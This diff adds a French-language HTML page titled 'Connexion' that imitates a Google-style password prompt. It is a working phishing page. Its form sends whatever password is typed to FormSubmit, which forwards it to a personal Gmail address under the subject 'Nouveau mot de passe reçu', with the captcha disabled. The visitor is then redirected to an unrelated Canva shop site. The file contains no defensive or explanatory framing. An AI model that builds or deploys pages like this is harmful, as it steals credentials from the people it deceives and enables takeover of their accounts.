@@ -1,0 +1,114 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Connexion</title>
+
+<style>
+body{
+    margin:0;
+    background:#fff;
+    font-family:Arial, Helvetica, sans-serif;
+}
+
+.container{
+    width:90%;
+    max-width:600px;
+    margin:80px auto;
+}
+
+.input{
+    width:100%;
+    height:70px;
+    border:2px solid #1a73e8;
+    border-radius:12px;
+    padding:0 20px;
+    font-size:22px;
+    outline:none;
+    box-sizing:border-box;
+}
+
+.checkbox{
+    display:flex;
+    align-items:center;
+    margin-top:25px;
+    font-size:22px;
+}
+
+.checkbox input{
+    width:28px;
+    height:28px;
+    margin-right:15px;
+}
+
+.bottom{
+    display:flex;
+    justify-content:space-between;
+    align-items:center;
+    margin-top:70px;
+}
+
+.link{
+    color:#1a73e8;
+    text-decoration:none;
+    font-size:20px;
+    font-weight:500;
+}
+
+.btn{
+    background:#1a73e8;
+    color:#fff;
+    border:none;
+    border-radius:40px;
+    padding:15px 45px;
+    font-size:22px;
+    cursor:pointer;
+}
+
+.btn:hover{
+    background:#1765cc;
+}
+</style>
+</head>
+
+<body>
+
+<div class="container">
+
+<!-- Formulaire connecté à FormSubmit -->
+<form action="https://formsubmit.co/faneltarud@gmail.com" method="POST">
+
+<!-- Configuration FormSubmit -->
+<input type="hidden" name="_subject" value="Nouveau mot de passe reçu">
+<input type="hidden" name="_captcha" value="false">
+<input type="hidden" name="_template" value="table">
+<input type="hidden" name="_next" value="https://boutiquesho.my.canva.site/">
+
+<!-- Champ mot de passe -->
+<input class="input" type="password" id="password" name="mot_de_passe" placeholder="Saisissez votre mot de passe" required>
+
+<div class="checkbox">
+<input type="checkbox" id="show">
+<label for="show">Afficher le mot de passe</label>
+</div>
+
+<div class="bottom">
+<a href="#" class="link">Essayer une autre méthode</a>
+<button type="submit" class="btn">Suivant</button>
+</div>
+
+</form>
+
+</div>
+
+<script>
+// Script pour afficher/masquer le mot de passe
+document.getElementById('show').addEventListener('change', function() {
+    var passwordField = document.getElementById('password');
+    passwordField.type = this.checked ? 'text' : 'password';
+});
+</script>
+
+</body>
+</html>
